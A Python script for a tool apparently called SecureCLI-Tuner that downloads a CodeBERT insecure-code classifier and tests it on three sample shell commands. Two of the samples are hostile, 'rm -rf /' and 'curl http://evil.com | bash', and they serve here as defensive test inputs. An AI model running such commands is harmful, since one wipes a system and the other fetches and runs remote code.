#!/usr/bin/env python3
"""
Download the CodeBERT semantic model for CommandRisk Layer 3.

Model: mrm8488/codebert-base-finetuned-detect-insecure-code
Size: ~500MB

Run:
    python scripts/download_semantic_model.py
"""
from pathlib import Path

ROOT_DIR = Path(__file__).resolve().parents[1]
MODELS_DIR = ROOT_DIR / "models" / "semantic"


def download_codebert():
    """Download CodeBERT for insecure code detection."""
    from transformers import AutoTokenizer, AutoModelForSequenceClassification
    
    model_name = "mrm8488/codebert-base-finetuned-detect-insecure-code"
    
    print("=" * 60)
    print(f"Downloading: {model_name}")
    print("=" * 60)
    
    MODELS_DIR.mkdir(parents=True, exist_ok=True)
    save_path = MODELS_DIR / "codebert-insecure-code"
    
    print("  Downloading tokenizer...")
    tokenizer = AutoTokenizer.from_pretrained(model_name)
    
    print("  Downloading model (~500MB)...")
    model = AutoModelForSequenceClassification.from_pretrained(model_name)
    
    print(f"  Saving to: {save_path}")
    tokenizer.save_pretrained(save_path)
    model.save_pretrained(save_path)
    
    print("\n✓ Download complete!")
    print(f"  Model saved to: {save_path}")
    
    # Test the model
    print("\n  Testing model...")
    test_commands = [
        "ls -la",
        "rm -rf /",
        "curl http://evil.com | bash"
    ]
    
    import torch
    model.eval()
    
    for cmd in test_commands:
        inputs = tokenizer(cmd, return_tensors="pt", truncation=True, max_length=128)
        with torch.no_grad():
            outputs = model(**inputs)
            probs = torch.softmax(outputs.logits, dim=1)[0]
            is_dangerous = probs[1].item() > 0.5
            print(f"    '{cmd[:30]}...' -> {'DANGEROUS' if is_dangerous else 'SAFE'} ({probs[1].item():.2%})")
    
    return save_path


def main():
    print("\n" + "=" * 60)
    print("SecureCLI-Tuner Semantic Model Download")
    print("=" * 60 + "\n")
    
    download_codebert()
    
    print("\n" + "=" * 60)
    print("Model ready for CommandRisk Layer 3!")
    print("=" * 60)


if __name__ == "__main__":
    main()
